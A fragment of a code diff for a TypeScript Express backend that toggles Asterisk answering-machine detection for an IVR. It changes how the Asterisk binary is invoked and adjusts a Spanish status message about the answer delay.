+        : 'Se ejecutó la verificación AMD; revisa los indicadores para confirmar el estado en tu VPS Asterisk.',
+    });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
 // Endpoint to toggle AMD detection on or off
 app.post('/api/asterisk/amd/toggle', requireAdminRole, async (req, res) => {
   try {
@@ -10514,7 +10746,8 @@ app.post('/api/asterisk/amd/toggle', requireAdminRole, async (req, res) => {
     const dbVal = isAmdEnabled ? '1' : '0';
     await executeAsteriskCommand(`database put ivr_vars amd_enabled "${dbVal}"`).catch(() => {});
     if (hasLocalAsterisk) {
-      exec('asterisk -rx "module load app_amd.so" 2>/dev/null; asterisk -rx "module reload app_amd.so" 2>/dev/null', () => {});
+      const bin = getAsteriskBinary();
+      exec(`"${bin}" -rx "module load app_amd.so" 2>/dev/null; "${bin}" -rx "module reload app_amd.so" 2>/dev/null`, () => {});
     }
     console.log(`[AMD TOGGLE] Detección de contestador/grabadora (AMD) -> ${isAmdEnabled ? 'ACTIVADA (1)' : 'DESACTIVADA (0)'}`);
 
@@ -10534,7 +10767,7 @@ app.post('/api/asterisk/amd/toggle', requireAdminRole, async (req, res) => {
       enabled: isAmdEnabled,
       message: isAmdEnabled
         ? 'Detección de grabadora (AMD) ACTIVADA: El IVR entrará en cuanto el cliente hable (y colgará/reintentará si es contestador).'
-        : 'Detección de grabadora (AMD) DESACTIVADA: Al contestar el cliente esperará 2 segundos antes de iniciar el IVR.',
+        : 'Detección de grabadora (AMD) DESACTIVADA: Al contestar el cliente esperará 1.2 segundos antes de iniciar el IVR.',
     });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
